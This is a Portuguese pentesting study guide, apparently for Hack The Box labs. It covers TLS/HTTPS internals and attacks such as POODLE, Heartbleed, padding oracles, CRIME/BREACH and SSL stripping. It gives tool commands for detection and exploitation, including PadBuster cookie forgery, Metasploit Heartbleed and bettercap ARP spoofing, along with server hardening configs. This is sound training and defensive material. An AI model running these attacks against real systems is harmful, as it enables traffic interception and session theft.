---
title: "TLS/HTTPS Attacks"
---

# O que é?

TLS (Transport Layer Security) é o protocolo criptográfico que garante comunicação segura sobre redes como a internet. É o successor direto do SSL (Secure Sockets Layer), protocolo desenvolvido pela Netscape nos anos 90. HTTPS nada mais é do que HTTP executado sobre uma camada TLS — o "S" de seguro.

A evolução das versões reflete décadas de vulnerabilidades descobertas e corrigidas:

- **SSL 2.0 (1995)**: primeira versão pública, rapidamente abandonada por falhas graves de design — múltiplas vulnerabilidades estruturais, sem suporte a MAC moderno, sujeita a ataques de downgrade.
- **SSL 3.0 (1996)**: revisão completa, amplamente adotada por anos. Vulnerável ao ataque POODLE (2014), oficialmente deprecado pela RFC 7568 em 2015.
- **TLS 1.0 (1999)**: renomeação do SSL 3.0 com pequenas melhorias. Vulnerável ao BEAST (2011). Deprecado pela RFC 8996 em 2021.
- **TLS 1.1 (2006)**: correções para BEAST, melhor tratamento de IV. Ainda deprecado pela RFC 8996 em 2021.
- **TLS 1.2 (2008)**: versão atual amplamente utilizada. Suporte a AEAD (AES-GCM), SHA-256, cipher suites modernas. Ainda seguro quando bem configurado.
- **TLS 1.3 (2018, RFC 8446)**: versão mais recente e mais segura. Removeu cipher suites inseguros, handshake mais rápido (1-RTT), Perfect Forward Secrecy obrigatório, sem compressão, sem renogociação.

Os componentes fundamentais do TLS são:

**Certificados X.509**: estrutura de dados que vincula uma chave pública a uma identidade (domínio, organização). Assinado por uma Certificate Authority (CA) confiável. Contém: nome do sujeito, chave pública, validade, assinatura da CA, extensions (SANs, uso de chave).

**Cipher Suites**: conjunto de algoritmos que define como a sessão será protegida. Em TLS 1.2 define quatro componentes: Key Exchange, Authentication, Symmetric Cipher e MAC. Em TLS 1.3 o formato foi simplificado — Key Exchange é separado e apenas três cipher suites AEAD são suportadas.

**PKI (Public Key Infrastructure)**: hierarquia de confiança baseada em Certificate Authorities. Root CAs são pré-instaladas nos sistemas operacionais e browsers. Intermediate CAs assinam certificados finais (leaf certificates). A chain de confiança permite que qualquer browser valide qualquer certificado do mundo sem precisar conhecê-lo previamente.

**AEAD (Authenticated Encryption with Associated Data)**: primitiva criptográfica que combina confidencialidade e integridade em uma única operação. AES-GCM e ChaCha20-Poly1305 são os AEAD modernos usados em TLS 1.2+ e TLS 1.3. Substituíram o modelo inseguro MAC-then-Encrypt do SSL e TLS antigos.

---

# Onde é implementado?

TLS é onipresente em qualquer comunicação que exija confidencialidade ou integridade na internet moderna. Praticamente toda comunicação sensível usa TLS como camada de transporte seguro:

**Web (HTTPS)**: todo site que exibe o cadeado no browser usa TLS. Google, bancos, redes sociais, e-commerce. A partir de 2018, o Chrome passou a marcar sites HTTP como "Not Secure", acelerando a adoção universal de HTTPS.

**Email**: SMTP sobre TLS (porta 587/465), IMAP sobre TLS (IMAPS, porta 993), POP3 sobre TLS (POP3S, porta 995). Protege o conteúdo de emails em trânsito entre cliente e servidor de email, e entre servidores de email (SMTP com STARTTLS).

**FTP**: FTPS (FTP over TLS, portas 990/989) protege transferências de arquivo. Diferente do SFTP, que usa SSH como transporte.

**LDAP**: LDAPS (porta 636) em ambientes corporativos para proteger consultas ao Active Directory e outros servidores de diretório. Autenticações com senha transitam pelo LDAP — sem TLS, credenciais são expostas em texto claro.

**Bancos de dados**: MySQL suporta conexões SSL/TLS (`--ssl-mode=REQUIRED`), PostgreSQL com `sslmode=require`, MongoDB com TLS configurado via `net.tls`. Em ambientes de produção, conexões de aplicação ao banco de dados devem usar TLS, especialmente quando o banco está em host separado.

**VPNs**: OpenVPN usa TLS para o canal de controle (troca de chaves, autenticação) e pode usar TLS para o canal de dados. SoftEther VPN opera sobre HTTPS/TLS para atravessar firewalls restritivos.

**APIs e microserviços**: APIs REST em produção servem exclusivamente via HTTPS. gRPC usa TLS como padrão em produção (mTLS para autenticação mútua entre serviços). GraphQL endpoints, webhooks, OAuth callbacks — todos exigem HTTPS.

**WebSockets**: WSS (WebSocket Secure) é WebSocket sobre TLS, análogo ao HTTPS para WebSocket. Aplicações de tempo real (chat, notificações, dashboards) usam WSS em produção.

**IoT e dispositivos embarcados**: sensores, câmeras, dispositivos industriais modernos usam TLS para comunicar com backends na nuvem. Versões leves como TLS-PSK (Pre-Shared Key) são usadas onde infraestrutura de PKI é complexa demais.

**Kubernetes e orquestração**: comunicação entre componentes do cluster (API server, etcd, kubelet) usa TLS com mTLS. Ingress controllers terminam TLS para serviços internos.

---

# Como funciona de forma adequada?

## TLS 1.3 Handshake — O Fluxo Correto

TLS 1.3 otimizou o handshake para 1-RTT (um round-trip), reduzindo latência e eliminando cipher suites vulneráveis. Todo o processo de estabelecimento de sessão segura ocorre da seguinte forma:

```
Cliente                                      Servidor
   |                                             |
   |--- ClientHello --------------------------->|
   |    [versoes suportadas: TLS 1.3]            |
   |    [cipher suites: TLS_AES_256_GCM_SHA384,  |
   |     TLS_AES_128_GCM_SHA256,                 |
   |     TLS_CHACHA20_POLY1305_SHA256]           |
   |    [key_share: chave publica ECDHE]         |
   |    [supported_groups: x25519, P-256]        |
   |    [random: 32 bytes aleatorios]            |
   |                                             |
   |<-- ServerHello ----------------------------  |
   |    [versao escolhida: TLS 1.3]              |
   |    [cipher suite escolhida]                 |
   |    [key_share: chave publica ECDHE servidor]|
   |    [random: 32 bytes aleatorios]            |
   |                                             |
   |    [HANDSHAKE KEYS DERIVADAS AQUI]          |
   |    [tudo abaixo ja e cifrado]               |
   |                                             |
   |<-- {Certificate} --------------------------  |
   |    [certificado X.509 do servidor]          |
   |                                             |
   |<-- {CertificateVerify} --------------------  |
   |    [assinatura sobre o handshake completo]  |
   |                                             |
   |<-- {Finished} -----------------------------  |
   |    [MAC sobre todo o handshake]             |
   |                                             |
   |--- {Finished} ---------------------------->|
   |    [MAC sobre todo o handshake]             |
   |                                             |
   |    [APPLICATION KEYS DERIVADAS AQUI]        |
   |                                             |
   |<==========  Dados Cifrados  ============>|
   |    [HTTP requests/responses, etc.]          |
```

Diferenças críticas em relação ao TLS 1.2:
- **1-RTT**: dados de aplicação fluem antes da confirmação final do cliente (0-RTT disponível para reconexão)
- **Handshake cifrado**: tudo após ServerHello é cifrado — Certificate e CertificateVerify não transitam em claro
- **Sem RSA Key Exchange**: apenas ECDHE e DHE, forçando Perfect Forward Secrecy em todas as sessões
- **Sem compressão**: eliminada completamente para prevenir CRIME e variantes
- **Sem renogociação**: sessões não podem ser renogociadas, eliminando vetores de ataque relacionados

## Cipher Suites — Anatomia

Uma cipher suite é a especificação completa dos algoritmos criptográficos de uma sessão TLS. O formato difere entre versões:

**TLS 1.2 — quatro componentes:**

```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 ^    ^     ^        ^    ^    ^
 |    |     |        |    |    +-- Hash para PRF/HMAC
 |    |     |        |    +------- Modo de operacao (GCM = AEAD)
 |    |     |        +------------ Cifra simetrica (AES 256 bits)
 |    |     +---------------------- Autenticacao (chave publica RSA)
 |    +---------------------------- Key Exchange (ECDH Ephemeral)
 +--------------------------------- Protocolo
```

**TLS 1.3 — apenas AEAD (key exchange separado):**

```
TLS_AES_256_GCM_SHA384
 ^   ^    ^   ^   ^
 |   |    |   |   +-- Hash para HKDF (derivacao de chaves)
 |   |    |   +------- Modo AEAD (Galois/Counter Mode)
 |   |    +----------- Tamanho da chave AES (256 bits)
 |   +---------------- Cifra simetrica
 +-------------------- Protocolo
```

Cipher suites TLS 1.3 suportadas (apenas três):
- `TLS_AES_128_GCM_SHA256`
- `TLS_AES_256_GCM_SHA384`
- `TLS_CHACHA20_POLY1305_SHA256`

## Certificate Chain e Validação

A validação de certificados segue uma hierarquia de confiança (PKI):

```
Root CA (auto-assinado, pre-instalado no SO/browser)
    |
    | assina
    v
Intermediate CA (nao pre-instalado, enviado pelo servidor)
    |
    | assina
    v
Leaf Certificate (certificado do dominio alvo)
    |
    | contém
    v
Chave publica do servidor (usada no handshake)
```

O browser valida:
1. Assinatura de cada certificado na chain (leaf → intermediate → root)
2. Validade temporal (NotBefore, NotAfter)
3. Subject Alternative Names (SANs) — domínio corresponde ao certificado
4. Certificate Revocation (OCSP stapling ou CRL)
5. CT Logs (Certificate Transparency) — certificado foi publicado em log público

## Perfect Forward Secrecy (PFS)

PFS garante que comprometer a chave privada do servidor no futuro não compromete sessões passadas gravadas. O mecanismo é ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):

```
Sessao SEM PFS (TLS_RSA_*):
   Cliente cifra pre-master secret com chave publica RSA do servidor.
   Se a chave privada RSA for comprometida anos depois,
   o atacante pode decifrar qualquer gravacao historica de trafego.

Sessao COM PFS (TLS_ECDHE_*):
   Cliente e servidor geram pares de chaves ECDHE efemeros por sessao.
   Apos a sessao, as chaves efemeras sao descartadas.
   Comprometer a chave RSA/ECDSA permanente nao ajuda o atacante —
   ele precisaria das chaves efemeras, que nao existem mais.
```

## HSTS e Certificate Pinning

**HSTS (HTTP Strict Transport Security)**: instrui browsers a sempre usar HTTPS, mesmo que o usuário tente HTTP:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000`: política válida por 1 ano
- `includeSubDomains`: aplica a todos os subdomínios
- `preload`: domínio pode ser incluído na lista de preload dos browsers (HTTPS forçado desde o primeiro acesso, mesmo sem visita prévia)

**Certificate Pinning**: mecanismo onde a aplicação só aceita um conjunto específico de certificados ou chaves públicas, rejeitando qualquer outro — mesmo que seja assinado por uma CA confiável. Usado em apps mobile e ambientes críticos para prevenir ataques com CA comprometida ou mal-configurada.

---

## A Falha: Protocolos Criptográficos com Suposições de Segurança Quebradas

TLS (Transport Layer Security) e o protocolo que protege o trafego HTTPS. Vulnerabilidades em TLS comprometem a confidencialidade e integridade de TODA a comunicacao, nao apenas de um endpoint especifico.

A suposicao de design errada: o desenvolvedor habilita HTTPS no servidor e acredita que a comunicacao esta segura, independentemente de qual versao de TLS ou quais cipher suites estao habilitadas. A realidade e que suites de cifra e versoes de protocolo sao negociadas durante o handshake — o cliente pode propor versoes e algoritmos mais fracos, e se o servidor aceitar, a sessao usa o nivel de seguranca mais baixo que ambos suportam.

**Perspectiva do desenvolvedor vs. da realidade:**

O desenvolvedor pensa: "habilitei HTTPS, o cadeado aparece no browser, estou seguro". A realidade e que se o servidor aceitar `SSLv3`, um atacante pode forcar o cliente a negociar SSLv3 (POODLE). Se aceitar cipher suites com CBC mode, pode explorar BEAST ou Lucky13. Se aceitar 3DES, pode explorar SWEET32. Algoritmos como RC4, DES e CBC mode com padding foram considerados seguros quando implementados e tiveram vulnerabilidades matematicas descobertas anos depois.

**Por que servidores mantem versoes antigas:** compatibilidade com clientes legados. Remover suporte a TLS 1.0 pode quebrar browsers antigos, sistemas embedded, ou integrações com parceiros que nao atualizaram. Os administradores habilitam suporte amplo para garantir compatibilidade e nao percebem que cada versao antiga habilitada abre um vetor de ataque especifico.

Ataques bem-sucedidos permitem:
- Descriptografar trafico interceptado (Padding Oracle, POODLE, BEAST)
- Vazar chaves privadas e conteudo de memoria (Heartbleed)
- Degradar versao TLS para explorar vulnerabilidades antigas (Downgrade attacks)
- Roubar cookies de sessao via compressao TLS (CRIME, BREACH)
- Executar Man-in-the-Middle completo via SSL Stripping

A importancia em pentesting: servidores nao atualizados frequentemente mantem suporte a versoes antigas de TLS (1.0, 1.1, SSL 3.0) por razoes de compatibilidade. Cada versao antiga habilita ataques especificos. Identificar e explorar esses vetores e parte do escopo de avaliacao de seguranca de infraestrutura.

---

## Causa Raiz

A causa raiz esta na negociacao de protocolo: o servidor anuncia as versoes e cipher suites que suporta, e o cliente escolhe. Se o servidor aceitar versoes inseguras, o atacante pode forcar a negociacao para o nivel mais fraco.

```bash
# Verificar quais versoes o servidor aceita (problema de configuracao)
openssl s_client -ssl3 -connect target.htb:443    # POODLE se conectar
openssl s_client -tls1 -connect target.htb:443    # BEAST se conectar
openssl s_client -tls1_1 -connect target.htb:443  # CRIME se conectar

# Verificar cipher suites fracas aceitas
openssl s_client -cipher 3DES -connect target.htb:443   # SWEET32
openssl s_client -cipher EXPORT -connect target.htb:443 # FREAK
openssl s_client -cipher RC4 -connect target.htb:443    # RC4 quebrado
```

**Configuracao segura — o que o servidor nao deve aceitar:**

```nginx
# nginx — desabilitar versoes e cipher suites vulneraveis
ssl_protocols TLSv1.2 TLSv1.3;  # APENAS 1.2 e 1.3
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers off;
ssl_compression off;   # CRIME
ssl_session_tickets off;
```

```apache
# apache — remover explicitamente versoes e algoritmos fracos
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite HIGH:!3DES:!RC4:!NULL:!aNULL:!eNULL:!EXPORT:!DH:!ADH:!MD5
SSLCompression off   # CRIME
```

**O que cada remocao previne:**
- `-SSLv3` — POODLE
- `-TLSv1 -TLSv1.1` — BEAST, CRIME, Lucky13
- `!3DES` — SWEET32
- `!RC4` — RC4 quebrado
- `!EXPORT` — FREAK
- `ssl_compression off` — CRIME
- Sem `TLS_RSA_*` — forca PFS (previne decriptacao retroativa)

---

## TLS Handshake, Cipher Suites e Vulnerabilidades Históricas de Protocolo

### TLS Handshake — Versao 1.2

O handshake TLS 1.2 estabelece a sessao segura em multiplos passos:

```
Cliente                          Servidor
   |                                 |
   |-- ClientHello ----------------->|  (versoes suportadas, cipher suites, random)
   |<-- ServerHello -----------------|  (versao escolhida, cipher suite, random)
   |<-- Certificate -----------------|  (certificado X.509 do servidor)
   |<-- ServerKeyExchange ------------|  (parametros Diffie-Hellman, se DHE/ECDHE)
   |<-- ServerHelloDone -------------|
   |-- ClientKeyExchange ----------->|  (pre-master secret cifrado com chave publica)
   |-- ChangeCipherSpec ------------>|  (indica inicio de cifragem)
   |-- Finished --------------------->|  (hash de todo o handshake, cifrado)
   |<-- ChangeCipherSpec ------------|
   |<-- Finished ---------------------|
   |                                 |
   |<====== Dados Cifrados =========>|
```

### TLS Handshake — Versao 1.3

TLS 1.3 simplifica o handshake e remove cipher suites vulneraveis:

```
Cliente                          Servidor
   |                                 |
   |-- ClientHello ----------------->|  (inclui parametros DH diretamente)
   |<-- ServerHello + Certificate ---|  (parametros DH + certificado)
   |<-- Finished (cifrado) ----------|  (tudo apos ServerHello e cifrado)
   |-- Finished (cifrado) ----------->|
   |                                 |
   |<====== Dados Cifrados =========>|
```

Diferencas criticas em TLS 1.3:
- Todo o handshake apos ServerHello e cifrado
- Sem suporte a RSA key exchange (apenas PFS obrigatorio)
- Sem cipher suites com CBC, RC4, SHA1
- Sem compressao TLS

### Cipher Suites

Uma cipher suite define os algoritmos usados. Formato em TLS 1.2:

```
TLS_DH_RSA_WITH_AES_128_CBC_SHA256
    ^   ^            ^        ^
    |   |            |        +-- MAC (integridade)
    |   |            +----------- Cifragem simetrica
    |   +------------------------ Autenticacao
    +---------------------------- Key Exchange
```

Formato em TLS 1.3 (simplificado — key exchange separado):

```
TLS_AES_128_GCM_SHA256
    ^           ^
    |           +-- Hash para HKDF
    +-------------- Cifragem simetrica + AEAD
```

**Perfect Forward Secrecy (PFS):**
PFS garante que comprometer a chave privada futuramente nao compromete sessoes passadas. Cipher suites com PFS:
- `TLS_DHE_*` — Diffie-Hellman Ephemeral
- `TLS_ECDHE_*` — Elliptic Curve Diffie-Hellman Ephemeral

Cipher suites SEM PFS (vulneraveis a decriptacao retroativa):
- `TLS_RSA_*` — chave de sessao cifrada com chave publica RSA permanente

### Vulnerabilidades Historicas

| Ataque | Ano | Versao Afetada | Tipo |
|---|---|---|---|
| BEAST | 2011 | SSL 3.0, TLS 1.0 | CBC mode attack |
| CRIME | 2012 | SSL/TLS com compressao | Compression oracle |
| LUCKY13 | 2013 | TLS com MAC-then-Encrypt + CBC | Timing attack |
| POODLE | 2014 | SSL 3.0 | Padding oracle |
| Heartbleed | 2014 | OpenSSL 1.0.1 a 1.0.1f | Buffer over-read |
| FREAK | 2015 | RSA_EXPORT cipher suites | Downgrade |
| DROWN | 2016 | SSL 2.0 | Bleichenbacher variant |
| SWEET32 | 2016 | 3DES, Blowfish (64-bit blocks) | Birthday attack |

---

## Identificacao

### testssl.sh — Avaliacao Abrangente de TLS

```bash
# Instalar
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Scan completo
bash testssl.sh https://target.htb

# Apenas verificar vulnerabilidades especificas
bash testssl.sh --poodle https://target.htb
bash testssl.sh --heartbleed https://target.htb
bash testssl.sh --beast https://target.htb
bash testssl.sh --crime https://target.htb
bash testssl.sh --breach https://target.htb
bash testssl.sh --drown https://target.htb
bash testssl.sh --freak https://target.htb
bash testssl.sh --logjam https://target.htb
bash testssl.sh --sweet32 https://target.htb

# Verificar cipher suites
bash testssl.sh --cipher-per-proto https://target.htb

# Verificar protocolos suportados
bash testssl.sh --protocols https://target.htb

# Output em JSON
bash testssl.sh --jsonfile result.json https://target.htb

# Output em HTML
bash testssl.sh --htmlfile result.html https://target.htb
```

### TLS-Breaker — Ferramenta de Exploits TLS (Java)

```bash
# Download
wget https://github.com/tls-attacker/TLS-Breaker/releases/download/v1.4.0/TLS-Breaker-1.4.0-SNAPSHOT.zip
unzip TLS-Breaker-1.4.0-SNAPSHOT.zip
cd TLS-Breaker-1.4.0-SNAPSHOT/apps/

# Verificar POODLE
java -jar poodle-1.0.1.jar -connect 127.0.0.1:30001

# Verificar Heartbleed
java -jar heartbleed-1.0.1.jar -connect 127.0.0.1:443

# Verificar Bleichenbacher
java -jar bleichenbacher-1.0.1.jar -connect 127.0.0.1:443

# Verificar DROWN
java -jar drown-1.0.1.jar -connect 127.0.0.1:443
```

### nmap — Scripts TLS

```bash
# Enumerar cipher suites e protocolos
nmap --script ssl-enum-ciphers -p 443 target.htb

# Verificar Heartbleed
nmap --script ssl-heartbleed -p 443 target.htb

# Verificar POODLE
nmap --script ssl-poodle -p 443 target.htb

# Verificar CCS Injection
nmap --script ssl-ccs-injection -p 443 target.htb

# Verificar certificado
nmap --script ssl-cert -p 443 target.htb

# Todos os scripts SSL de uma vez
nmap --script "ssl-*" -p 443 target.htb
```

### openssl — Verificacoes Manuais

```bash
# Verificar suporte a SSL 3.0
openssl s_client -ssl3 -connect target.htb:443 2>/dev/null | head -5
# Se conectar: SSL 3.0 suportado (POODLE vulneravel)

# Verificar suporte a TLS 1.0
openssl s_client -tls1 -connect target.htb:443 2>/dev/null | head -5

# Verificar suporte a TLS 1.1
openssl s_client -tls1_1 -connect target.htb:443 2>/dev/null | head -5

# Verificar cipher suites de exportacao (FREAK)
openssl s_client -cipher EXPORT -connect target.htb:443 2>/dev/null | head -5

# Verificar 3DES (SWEET32)
openssl s_client -cipher 3DES -connect target.htb:443 2>/dev/null | head -5

# Verificar compressao (CRIME)
openssl s_client -connect target.htb:443 2>/dev/null | grep -i compress

# Ver certificado completo
openssl s_client -connect target.htb:443 2>/dev/null | openssl x509 -text
```

---

## Exploitation

### Padding Oracle Attack

Um padding oracle ocorre quando o servidor retorna respostas DIFERENTES para:
- Padding invalido: erro especifico (ex: "Invalid padding")
- Padding valido mas conteudo invalido: outro erro (ex: "Decryption error")

Em modo CBC, cada bloco cifrado afeta o bloco seguinte durante a descriptografia. Um atacante pode usar essa diferenca de resposta para descriptografar blocos um byte por vez, sem conhecer a chave.

**Identificar padding oracle:**

```bash
# Testar com PadBuster
padbuster http://127.0.0.1:1337/admin "COOKIE_VALUE" 16 -encoding 0 -cookies "user=COOKIE_VALUE"
```

Flags:
- `16` = tamanho do bloco em bytes (AES = 16, 3DES = 8)
- `-encoding 0` = base64 URL-safe
- `-encoding 1` = hex
- `-encoding 2` = base64 padrao

**Descriptografar valor existente:**

```bash
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 \
  -encoding 0 \
  -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0="
```

Output revela o plaintext: `user=htb-stdnt`

**Cifrar valor arbitrario:**

```bash
# Criar cookie com user=admin
padbuster http://127.0.0.1:1337/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 \
  -encoding 0 \
  -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" \
  -plaintext "user=admin"
```

PadBuster retorna o ciphertext que, quando usado como cookie, autentica como `user=admin`.

### POODLE Attack (SSL 3.0)

POODLE (Padding Oracle On Downgraded Legacy Encryption) explora a implementacao de padding em SSL 3.0 para descriptografar bytes do trafego HTTPS.

**Pre-requisito:** Servidor suporta SSL 3.0

```bash
# Verificar
openssl s_client -ssl3 -connect target.htb:443

# Com TLS-Breaker
java -jar apps/poodle-1.0.1.jar -connect 127.0.0.1:30001
```

Output confirma vulnerabilidade se retornar `POODLE vulnerability found`.

**Mitigacao:** Desabilitar SSL 3.0 no servidor:

```apache
# Apache
SSLProtocol all -SSLv2 -SSLv3
SSLProtocol +TLSv1.2 +TLSv1.3
```

```nginx
# Nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

### Heartbleed (CVE-2014-0160)

Heartbleed afeta OpenSSL 1.0.1 ate 1.0.1f. A extensao TLS Heartbeat permite que um lado envie um "heartbeat" com um payload e um comprimento declarado. OpenSSL nao validava se o comprimento declarado correspondia ao payload real — um atacante podia declarar comprimento 65535 com payload vazio e ler ate 64KB da memoria do servidor.

Conteudo que pode vazar: chaves privadas, certificados, passwords, session tokens.

**Identificar:**

```bash
# nmap
nmap --script ssl-heartbleed -p 443 target.htb

# openssl (versao especifica para teste)
openssl s_client -connect target.htb:443 -tlsextdebug 2>&1 | grep -i heartbeat

# TLS-Breaker
java -jar apps/heartbleed-1.0.1.jar -connect 127.0.0.1:443
```

**Explorar:**

```bash
# Exploit Python classico
python heartbleed.py target.htb 443

# Metasploit
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.htb
set RPORT 443
run
```

**Mitigacao:** Atualizar OpenSSL para versao >= 1.0.1g ou 1.0.2.

### SSL Stripping

SSL Stripping e um ataque Man-in-the-Middle onde o atacante intercepta a conexao entre cliente e servidor, servindo HTTP ao cliente enquanto mantem HTTPS com o servidor.

**Fluxo do ataque:**

```
Cliente <--HTTP--> Atacante <--HTTPS--> Servidor
```

1. ARP Spoofing para se posicionar no caminho
2. Interceptar request HTTP inicial do cliente
3. Fazer o request ao servidor via HTTPS
4. Servir response para o cliente via HTTP (sem TLS)
5. Todo trafego e visivel ao atacante

**Executar ARP Spoofing com arpspoof:**

```bash
# Habilitar IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoofing para interceptar trafego
sudo arpspoof -i docker0 -t 172.17.0.4 172.17.0.1
```

**Usando bettercap:**

```bash
# Via Docker
docker run -it --net=host bettercap/bettercap

# Dentro do bettercap
set arp.spoof.targets 172.17.0.4
set arp.spoof.internal true
set http.proxy.sslstrip true
arp.spoof on
http.proxy on
```

**Prevencao — HSTS (HTTP Strict Transport Security):**

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — 1 ano em segundos
- `includeSubDomains` — aplica a todos os subdominios
- `preload` — permite pre-carregamento em navegadores

Com HSTS, o browser nunca faz request HTTP — sempre HTTPS. SSL Stripping e bloqueado porque o browser se recusa a usar HTTP mesmo que o atacante sirva HTTP.

**HSTS preload list:** Sites podem ser incluidos na lista de preload dos navegadores (HSTS obrigatorio desde o primeiro acesso).

### CRIME (Compression Ratio Info-leak Made Easy)

CRIME explora compressao TLS para vazar cookies. Quando TLS comprime o request antes de cifrar e o request inclui um cookie secreto e input do usuario, um atacante pode iterar sobre possiveis valores do cookie e observar o tamanho do ciphertext.

Se o input contiver parte do cookie, a compressao reduz mais o tamanho (strings repetidas comprimem melhor). Isso revela o cookie byte a byte.

**Condicao:** `ssl_compression` habilitado no servidor + cookie secreto no request

**Verificar:**

```bash
# testssl.sh
bash testssl.sh --crime https://target.htb

# openssl
openssl s_client -connect target.htb:443 2>/dev/null | grep -i compress
# Se retornar "Compression: zlib compression" -> CRIME vulneravel
```

**Mitigacao:** Desabilitar compressao TLS:

```nginx
# Nginx
ssl_session_tickets off;
gzip off;
```

```apache
# Apache
SSLCompression off
```

### BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)

BREACH e similar ao CRIME mas explora compressao HTTP (gzip na response) em vez de compressao TLS. Nao requer TLS vulneravel — funciona mesmo com TLS 1.3.

**Condicao:**
1. HTTP response com compressao gzip/deflate habilitada
2. Secret (CSRF token, cookie) refletido na response HTTP comprimida
3. Secret usa caracteres do conjunto de valores testados

**Identificar:**

```bash
# testssl.sh
bash testssl.sh --breach https://target.htb

# Verificar compressao na response
curl -H "Accept-Encoding: gzip" -I https://target.htb | grep -i "content-encoding"
```

**Mitigacao:**
- Desabilitar compressao HTTP para paginas com secrets
- Adicionar aleatoriedade ao CSRF token por request
- Separar CSRF token do conteudo comprimido

### Bleichenbacher Attack (PKCS#1 Padding Oracle)

Bleichenbacher (1998) explora um padding oracle em RSA/PKCS#1 v1.5. O servidor retorna erro diferente para ciphertext com padding RSA invalido vs valido mas conteudo errado.

**TLS-Breaker:**

```bash
java -jar apps/bleichenbacher-1.0.1.jar -connect 127.0.0.1:443
```

**DROWN (Decrypting RSA with Obsolete and Weakened eNcryption):**

Variante do Bleichenbacher que usa SSL 2.0 como oracle. Mesmo que o servidor alvo nao suporte SSL 2.0, se QUALQUER servidor usando a MESMA chave privada suporte SSL 2.0, o ataque e possivel.

```bash
java -jar apps/drown-1.0.1.jar -connect 127.0.0.1:443

# testssl.sh
bash testssl.sh --drown https://target.htb
```

### SWEET32 (Birthday Attack em Cifras de Bloco de 64 bits)

SWEET32 afeta cifragens com blocos de 64 bits como 3DES e Blowfish. Em uma sessao longa (> 32GB de dados), blocos cifrados comecam a se repetir (birthday bound), permitindo recuperacao do XOR do plaintext.

Em HTTPS pratico, um atacante pode forcar requests repetidos via JavaScript para gerar trafego suficiente.

**Identificar:**

```bash
bash testssl.sh --sweet32 https://target.htb
openssl s_client -cipher 3DES -connect target.htb:443
```

**Mitigacao:** Remover cipher suites com 3DES:

```apache
SSLCipherSuite HIGH:!3DES:!RC4:!NULL:!aNULL:!eNULL:!EXPORT:!DH:!ADH:!IDEA:!MD5
```

---

## Ferramentas

### testssl.sh

```bash
# Instalacao
git clone --depth 1 https://github.com/drwetter/testssl.sh.git

# Scan completo de um host
bash testssl.sh https://hackthebox.com

# Output formatado
bash testssl.sh --json-pretty https://target.htb | tee result.json
bash testssl.sh --html https://target.htb > result.html

# Sem SNI (Server Name Indication)
bash testssl.sh --noheader https://target.htb

# Especificar IP
bash testssl.sh --ip 10.10.14.5 https://target.htb

# Modo rapido (apenas vulnerabilidades criticas)
bash testssl.sh --fast https://target.htb

# Modo CI/CD (retorna codigo de saida nao-zero se vulneravel)
bash testssl.sh --severity HIGH https://target.htb
echo $?  # 0 = sem high, 1 = tem high severity
```

### TLS-Breaker

```bash
# Download e setup
wget https://github.com/tls-attacker/TLS-Breaker/releases/latest/download/TLS-Breaker.zip
unzip TLS-Breaker.zip
cd TLS-Breaker/apps/

# POODLE
java -jar poodle-1.0.1.jar -connect TARGET:PORT

# Heartbleed — apenas deteccao
java -jar heartbleed-1.0.1.jar -connect TARGET:PORT

# Heartbleed — executar ataque
java -jar heartbleed-1.0.1.jar -connect TARGET:PORT -executeAttack -heartbeats 10

# Bleichenbacher
java -jar bleichenbacher-1.0.1.jar -connect TARGET:PORT -scanDetail ALL

# DROWN
java -jar drown-1.0.1.jar -connect TARGET:PORT
```

### PadBuster

```bash
# Instalar
sudo apt install padbuster
# ou
git clone https://github.com/AonCyberLabs/PadBuster.git

# Descriptografar valor CBC
padbuster URL CIPHERTEXT BLOCK_SIZE [opcoes]

padbuster http://127.0.0.1:1337/admin \
  "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" \
  16 \
  -encoding 0 \
  -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0="

# Cifrar valor arbitrario
padbuster http://127.0.0.1:1337/admin \
  "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" \
  16 \
  -encoding 0 \
  -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" \
  -plaintext "user=admin"

# Encoding values:
# 0 = URL-encoded base64
# 1 = unencoded base64
# 2 = hex
# 3 = net
# 4 = html form encoding
```

### bettercap

```bash
# Via Docker
docker run -it --net=host bettercap/bettercap

# Instalacao nativa
sudo apt install bettercap

# Uso basico para SSL Stripping
sudo bettercap -iface eth0
# Dentro do bettercap:
net.probe on
net.recon on
set arp.spoof.targets VICTIM_IP
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
net.sniff on
```

---

## Detecção e Mitigação

### Configuração Segura de TLS

**Apache:**

```apache
SSLEngine on
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder off
SSLCompression off
SSLSessionTickets off
